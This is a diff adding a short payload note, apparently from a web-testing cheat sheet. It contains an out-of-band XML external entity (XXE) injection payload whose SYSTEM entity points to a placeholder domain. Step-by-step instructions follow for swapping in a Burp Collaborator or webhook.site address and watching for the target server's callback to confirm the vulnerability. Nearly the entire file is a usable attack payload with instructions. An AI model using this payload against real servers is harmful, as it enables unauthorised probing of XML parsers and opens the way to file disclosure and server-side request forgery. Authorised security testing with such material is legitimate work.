@@ -1,0 +1,20 @@
+<!DOCTYPE root [ <!ENTITY lastname SYSTEM "http://INSERTDOMAINHERE" > ]><employee id="1"><name>Amy &lastname;</name><salary>6000.0</salary></employee>
+
+# Use a public server to catch HTTP request from target.
+# via (1) burp collaborator - available only in burpsuite pro (2) webhook.site / Requestbin
+# Observe the user-agent found in the incoming HTTP request.
+
+# BURPSUITE COLLABORATOR
+1. Go to 'Burp' > 'Burp Collaborator client'.
+2. Click 'Copy to clipboard' which will copy the public burp collaborator domain to clipboard.
+3. Replace 'INSERTDOMAINHERE' with the copied domain.
+4. Send the request.
+5. Click 'Poll now' to check for incoming HTTP request.
+
+# webhook.site
+1. Go to https://webhook.site
+2. Copy the unique domain to clipboard.
+3. Replace 'INSERTDOMAINHERE' with the copied domain.
+4. Send the request.
+5. Observe the incoming request on the webhook site.
+
